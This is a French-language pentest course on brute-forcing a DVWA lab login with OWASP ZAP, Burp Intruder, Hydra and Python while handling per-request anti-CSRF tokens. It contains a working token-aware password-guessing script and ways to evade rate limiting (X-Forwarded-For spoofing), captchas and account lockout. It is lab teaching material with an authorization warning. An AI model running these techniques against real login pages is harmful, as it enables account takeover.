# Cours : Pentest Web - Fuzzing d'authentification avec OWASP ZAP

## Introduction

Le **fuzzing d'authentification** consiste à tester automatiquement différentes combinaisons de mots de passe pour identifier des credentials valides. Cette technique est courante en pentest, mais se complique lorsque l'application utilise des **tokens anti-CSRF** (Cross-Site Request Forgery) qui changent à chaque requête. [davidpierre](https://www.davidpierre.dev/blog/brute-forcing-dvwas-initial-login-page)

**⚠️ Important** : N'effectuez jamais de fuzzing sans autorisation écrite. Utilisez uniquement des environnements de lab légaux.

***

## Partie 1 : Configuration de l'environnement de lab

### 1.1 Lancement du lab avec Docker

**Cas d'usage** : Créer un environnement de test isolé pour pratiquer le fuzzing sans affecter des systèmes de production. [github](https://github.com/indigos33k3r/portainer-pentest-lab)

```bash
# Lancer les conteneurs Docker en arrière-plan
docker compose up -d

# Vérifier que les conteneurs sont actifs
docker ps

# Résultat typique :
# CONTAINER ID   IMAGE          STATUS          PORTS
# abc123         dvwa:latest    Up 2 minutes    0.0.0.0:80->80/tcp
```

**Explication** :
- `docker compose` : Gère plusieurs conteneurs définis dans `docker-compose.yml`
- `up` : Démarre les services
- `-d` : Détaché (background), libère le terminal

### 1.2 Accéder à l'application

```bash
# Dans un navigateur
http://localhost

# OU si sur une IP spécifique
http://192.168.1.100
```

***

## Partie 2 : Analyse de la requête d'authentification

### 2.1 Intercepter la requête POST de login

**Workflow** :

1. **Configurer OWASP ZAP comme proxy** (même principe que Burp Suite)
   - ZAP → Tools → Options → Local Proxies
   - Vérifier : `127.0.0.1:8080`
   - Configurer FoxyProxy dans le navigateur

2. **Activer l'interception**
   - ZAP → Break (icône pause verte)

3. **Tenter une connexion**
   - Username : `admin`
   - Password : `test123`
   - Soumettre le formulaire

4. **Observer la requête POST**

```http
POST /login.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded

username=admin&password=test123&user_token=a3f8e9c2b1d4567890abcdef&Login=Login
```

### 2.2 Identifier le token CSRF

**Observation clé** : La requête POST contient un paramètre `user_token`. [scribd](https://www.scribd.com/document/673237948/LAB-DVWA)

**Question** : D'où vient ce token ?

**Réponse** : Il est généré dans la **réponse GET** lors du chargement de la page de login.

**Vérification** :

```http
GET /login.php HTTP/1.1
Host: localhost
```

**Réponse** :

```html
<form method="POST">
    <input type="text" name="username">
    <input type="password" name="password">
    <input type="hidden" name="user_token" value="a3f8e9c2b1d4567890abcdef">
    <input type="submit" value="Login">
</form>
```

**Conclusion** : Le token CSRF change à **chaque chargement de page** pour empêcher les attaques automatisées. [davidpierre](https://www.davidpierre.dev/blog/brute-forcing-dvwas-initial-login-page)

***

## Partie 3 : Configuration du Fuzzer dans ZAP

### 3.1 Configurer la gestion des tokens anti-CSRF

**Problème** : Si ZAP n'est pas configuré pour gérer le token, toutes les requêtes fuzzing échoueront car elles utiliseront un token expiré. [davidpierre](https://www.davidpierre.dev/blog/brute-forcing-dvwas-initial-login-page)

**Solution** : Configurer ZAP pour extraire et réutiliser automatiquement le token.

#### Étape 1 : Ajouter le token dans les paramètres anti-CSRF

```
1. ZAP → Options (icône engrenage) ⚙️
2. Active Scan → Anti-CSRF Tokens
3. Cliquer sur "Add..."
4. Nom du token : user_token
5. OK
```

**Résultat** : ZAP va maintenant :
- Détecter automatiquement `user_token` dans les formulaires
- Extraire sa valeur avant chaque requête
- L'inclure dans les requêtes suivantes

### 3.2 Préparer la requête pour le fuzzing

#### Étape 2 : Envoyer la requête au Fuzzer

```
1. Dans l'historique ZAP, trouver la requête POST de login
2. Clic droit → Attack → Fuzz...
3. Sélectionner le paramètre "password" à fuzzer
4. Highlight "test123" → Add...
```

#### Étape 3 : Configurer le payload

```
1. Payload type : File
2. File : /usr/share/wordlists/rockyou.txt
   OU
   /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt

3. Encoding : None
4. Add
```

### 3.3 Gérer les redirections (code 302)

**Problème observé** : Lors du test, la requête POST retourne un code **302 Found** (redirection) au lieu de 200 OK. [jobyer](https://jobyer.me/posts/web-pentest/web-auth-pentesting/)

**Explication** :
- **302 Found** : L'application redirige vers une autre page après le login
- Si login réussi → redirection vers `/dashboard.php`
- Si login échoué → redirection vers `/login.php?error=failed`

**Solution** : Activer le suivi des redirections dans le fuzzer.

#### Étape 4 : Activer le suivi des redirections

```
1. Dans Fuzzer Options
2. ✅ Cocher "Follow redirects"
3. Message processing → Continue
```

**Résultat** : ZAP va maintenant suivre la redirection et afficher le contenu final de la page.

### 3.4 Ajouter un Tag Creator pour identifier les échecs

**Objectif** : Marquer automatiquement les réponses contenant le mot "failed" pour filtrer rapidement les échecs. [jobyer](https://jobyer.me/posts/web-pentest/web-auth-pentesting/)

#### Étape 5 : Configurer le Message Processor

```
1. Fuzzer Options → Message Processors
2. Add → Tag Creator
3. Configuration :
   - Tag name : "failed_login"
   - String to match : "failed"
   - Case sensitive : Non
4. Add
```

**Résultat** : Toutes les réponses contenant "failed" seront taguées et faciles à filtrer.

***

## Partie 4 : Problème de concurrence (threads multiples)

### 4.1 Première tentative : Échec total

**Observation** : Après lancement de l'attaque, **aucun résultat positif**, toutes les requêtes échouent. [davidpierre](https://www.davidpierre.dev/blog/brute-forcing-dvwas-initial-login-page)

**Symptôme** :
```
Request 1 : user_token=abc123 → 403 Forbidden
Request 2 : user_token=abc123 → 403 Forbidden
Request 3 : user_token=abc123 → 403 Forbidden
...
```

### 4.2 Diagnostic : Le problème des threads concurrents

**Cause racine** : Par défaut, ZAP utilise **plusieurs threads simultanés** (ex: 10 threads). [scribd](https://www.scribd.com/document/673237948/LAB-DVWA)

**Problème de séquence** :
1. Thread 1 charge la page → récupère `user_token=ABC123`
2. Thread 2 charge la page → récupère `user_token=DEF456` (nouveau token !)
3. Thread 1 envoie POST avec `user_token=ABC123`
4. **Mais le serveur attend maintenant `DEF456`** → Échec !

**Schéma du problème** :
```
Temps  Thread 1         Thread 2         Serveur
  1    GET login        -                Génère token: ABC
  2    -                GET login        Génère token: DEF (ABC invalide maintenant)
  3    POST (token ABC) -                ❌ Reject (attend DEF)
```

### 4.3 Solution : Un seul thread à la fois

**Principe** : Forcer ZAP à exécuter les requêtes **séquentiellement** (une par une) pour respecter le cycle GET → POST. [scribd](https://www.scribd.com/document/673237948/LAB-DVWA)

#### Étape 6 : Configurer le fuzzer en mode single-thread

```
1. Fuzzer Options
2. Advanced Options
3. Concurrent Scanning Threads per Scan : 1 (au lieu de 10)
4. OK
```

**Résultat** : ZAP va maintenant :
1. GET `/login.php` → Extraire `user_token`
2. POST `/login.php` avec le token valide
3. Attendre la réponse
4. Répéter pour le mot de passe suivant

**Schéma de la solution** :
```
Temps  Thread unique    Serveur
  1    GET login        Génère token: ABC
  2    POST (token ABC) ✅ Valide
  3    GET login        Génère token: DEF
  4    POST (token DEF) ✅ Valide
```

***

## Partie 5 : Comprendre le problème des threads multiples

### 5.1 Explication détaillée

**Pourquoi plusieurs threads posent problème avec les tokens CSRF ?**

Les tokens CSRF sont conçus comme une **protection anti-automatisation**. Voici comment ils fonctionnent :

1. **Le serveur génère un token unique** à chaque fois qu'une page de formulaire est chargée
2. **Ce token est stocké en session côté serveur** et aussi envoyé dans le formulaire HTML
3. **Lors de la soumission du formulaire**, le serveur compare le token reçu avec celui stocké en session
4. **Si les tokens ne correspondent pas** → Requête rejetée (protection CSRF)

**Le problème avec 10 threads simultanés** :

Imagine 10 threads qui s'exécutent en parallèle :

```
Thread 1 : GET → reçoit token_1 → (attend) → POST avec token_1
Thread 2 : GET → reçoit token_2 → (attend) → POST avec token_2  
Thread 3 : GET → reçoit token_3 → (attend) → POST avec token_3
...
Thread 10: GET → reçoit token_10 → (attend) → POST avec token_10
```

**Le problème** : Chaque fois qu'un nouveau GET est effectué, le serveur génère un NOUVEAU token et **invalide l'ancien**. Donc :

- Thread 1 récupère token_1
- Thread 2 fait un GET → le serveur génère token_2 et **invalide token_1**
- Thread 1 essaie de POST avec token_1 → **ÉCHEC** (token expiré)

**Conséquence avec 10 threads** : Sur 10 tentatives simultanées, **9 échoueront systématiquement** car leurs tokens auront été invalidés par les GET des autres threads. Seul le dernier thread qui a fait un GET aura un token valide, mais même lui échouera si un autre thread fait un GET entre-temps.

**Résultat** : **Taux de réussite proche de 0%**, même avec le bon mot de passe !

### 5.2 Pourquoi un seul thread résout le problème

Avec **1 seul thread**, la séquence est propre et respecte le cycle attendu par le serveur :

```
1. GET /login.php → Serveur génère token_A et le stocke en session
2. POST /login.php avec token_A → Serveur valide ✅
3. GET /login.php → Serveur génère token_B (token_A expiré)
4. POST /login.php avec token_B → Serveur valide ✅
```

**Avantage** : Chaque POST utilise le token le plus récent, aucun conflit.

**Inconvénient** : L'attaque est **beaucoup plus lente** (séquentielle au lieu de parallèle), mais c'est le prix à payer pour contourner la protection CSRF. [scribd](https://www.scribd.com/document/673237948/LAB-DVWA)

***

## Partie 6 : Lancement de l'attaque finale

### 6.1 Configuration complète récapitulative

**Checklist avant lancement** :

1. ✅ **Anti-CSRF token configuré** : `user_token` ajouté dans les options
2. ✅ **Payload chargé** : Wordlist de mots de passe
3. ✅ **Redirections activées** : Follow redirects coché
4. ✅ **Tag Creator configuré** : "failed" pour filtrer
5. ✅ **Threads = 1** : Mode séquentiel pour respecter les tokens

### 6.2 Lancer l'attaque

```
1. Fuzzer configuré avec tous les paramètres
2. Start Fuzzer
3. Observer les résultats en temps réel
```

### 6.3 Analyser les résultats

**Filtrer les résultats** :

```
1. Dans l'onglet Fuzzer Results
2. Filtrer par :
   - Code HTTP : Exclure 302 (redirections)
   - Tag : Exclure "failed_login"
   - Taille de réponse : Chercher une taille différente
```

**Indicateurs de succès** :
- **Code 200** au lieu de 302
- **Pas de tag "failed_login"**
- **Taille de réponse différente** (page dashboard au lieu de login)
- **Temps de réponse différent** (légèrement plus long) [jobyer](https://jobyer.me/posts/web-pentest/web-auth-pentesting/)

**Exemple de résultat positif** :
```
Request #127
Username : admin
Password : password123
Response : 200 OK
Size     : 5432 bytes (vs 1234 pour les échecs)
Tag      : Aucun (pas de "failed")
```

***

## Partie 7 : Alternatives et outils complémentaires

### 7.1 Burp Suite Intruder (même principe)

**Configuration similaire**  : [davidpierre](https://www.davidpierre.dev/blog/brute-forcing-dvwas-initial-login-page)

```
1. Intercepter la requête POST
2. Send to Intruder
3. Positions → Clear all → Sélectionner "password"
4. Payloads → Load wordlist
5. Options → Grep - Match → Add "failed"
6. Options → Redirections → Always
7. Resource pool → Create new (1 thread maximum)
8. Start attack
```

### 7.2 Hydra (ligne de commande)

**Limitation** : Hydra ne gère pas bien les tokens CSRF dynamiques. [jobyer](https://jobyer.me/posts/web-pentest/web-auth-pentesting/)

```bash
# Fonctionne uniquement si PAS de token CSRF
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  localhost http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=failed"
```

### 7.3 Script Python personnalisé (recommandé pour CSRF)

**Avantage** : Contrôle total du workflow GET → POST. [scribd](https://www.scribd.com/document/673237948/LAB-DVWA)

```python
#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup

url_login = "http://localhost/login.php"

# Charger la wordlist
with open("/usr/share/wordlists/rockyou.txt", "r", encoding="latin-1") as f:
    passwords = f.read().splitlines()

for password in passwords:
    # 1. GET pour récupérer le token
    session = requests.Session()
    response = session.get(url_login)
    soup = BeautifulSoup(response.text, 'html.parser')
    token = soup.find('input', {'name': 'user_token'})['value']
    
    # 2. POST avec le token récupéré
    data = {
        'username': 'admin',
        'password': password,
        'user_token': token,
        'Login': 'Login'
    }
    
    response = session.post(url_login, data=data, allow_redirects=True)
    
    # 3. Vérifier le succès
    if "failed" not in response.text.lower():
        print(f"[+] Password found: {password}")
        break
    else:
        print(f"[-] Trying: {password}")
```

**Exécution** :
```bash
chmod +x brute_csrf.py
./brute_csrf.py
```

***

## Partie 8 : Méthodologie complète de fuzzing

### 8.1 Checklist de reconnaissance

1. ✅ **Analyser le formulaire de login**
   - Méthode : POST ou GET ?
   - Paramètres : username, password, autres ?
   - Tokens présents ? (CSRF, session, captcha)

2. ✅ **Tester manuellement**
   - Créer un compte valide si possible
   - Tester avec credentials incorrects
   - Observer les réponses différentes

3. ✅ **Identifier les indicateurs d'échec**
   - Message d'erreur : "Invalid username or password"
   - Code HTTP : 403, 401, 302 ?
   - Taille de réponse différente ?
   - Temps de réponse (timing attack) [jobyer](https://jobyer.me/posts/web-pentest/web-auth-pentesting/)

### 8.2 Checklist de configuration ZAP/Burp

1. ✅ **Proxy configuré**
2. ✅ **Tokens CSRF identifiés et configurés**
3. ✅ **Redirections activées**
4. ✅ **Tag/Grep configurés pour filtrer**
5. ✅ **Threads = 1 si tokens dynamiques**
6. ✅ **Wordlist sélectionnée** (rockyou.txt, SecLists)

### 8.3 Wordlists recommandées

```bash
# Wordlists communes (déjà sur Kali Linux)
/usr/share/wordlists/rockyou.txt                    # 14M passwords
/usr/share/seclists/Passwords/Common-Credentials/   # Top 1000, 10k, etc.
/usr/share/seclists/Passwords/darkweb2017-top10000.txt

# Wordlists spécifiques par contexte
/usr/share/seclists/Passwords/Default-Credentials/  # Admin par défaut
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
```

### 8.4 Optimisation de l'attaque

**Stratégie progressive** :

```
1. Tester les 100 mots de passe les plus communs (rapide)
2. Si échec, tester les 10 000 premiers (moyen)
3. Si échec, tester rockyou.txt complet (long, 14M)
```

**Commande pour extraire** :
```bash
# Top 100 passwords
head -100 /usr/share/wordlists/rockyou.txt > top100.txt

# Top 10000
head -10000 /usr/share/wordlists/rockyou.txt > top10k.txt
```

***

## Partie 9 : Détection et contournement

### 9.1 Mécanismes de protection courants

**Rate limiting** : Blocage après X tentatives [jobyer](https://jobyer.me/posts/web-pentest/web-auth-pentesting/)
- **Symptôme** : Code 429 (Too Many Requests)
- **Contournement** : 
  - Ajouter header `X-Forwarded-For` avec IP aléatoire
  - Ralentir l'attaque (delay entre requêtes)

**Captcha** :
- **Symptôme** : Captcha apparaît après 3-5 tentatives
- **Contournement** : Utiliser services de résolution de captcha (2captcha, anticaptcha)

**Account lockout** : Compte bloqué après X échecs [jobyer](https://jobyer.me/posts/web-pentest/web-auth-pentesting/)
- **Symptôme** : Message "Account locked"
- **Contournement** : 
  - Alterner entre plusieurs usernames
  - Attendre le délai de déblocage

### 9.2 Exemple : Contourner le rate limiting avec X-Forwarded-For

**Dans ZAP** :
```
1. Fuzzer Options → Message Processors
2. Add → HTTP Header
3. Header name : X-Forwarded-For
4. Header value : ${RANDOM_IP}  (si ZAP supporte, sinon script Python)
```

**Script Python avec IP spoofing** :
```python
import random

def random_ip():
    return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

headers = {
    'X-Forwarded-For': random_ip()
}

response = session.post(url_login, data=data, headers=headers)
```

***

## Résumé : Points clés à retenir

1. **Tokens CSRF** changent à chaque requête → Configurer ZAP pour les extraire automatiquement
2. **Threads multiples** invalident les tokens → Chaque GET génère un nouveau token et invalide le précédent
3. **Avec 10 threads** : 9 tentatives sur 10 échouent car leurs tokens sont expirés avant le POST
4. **Solution** : Utiliser **1 seul thread** pour respecter le cycle GET → POST séquentiellement
5. **Redirections (302)** doivent être suivies → Activer "Follow redirects"
6. **Filtrer les résultats** avec tags/grep pour identifier rapidement les succès
7. **Scripts Python** offrent le meilleur contrôle pour les cas CSRF complexes
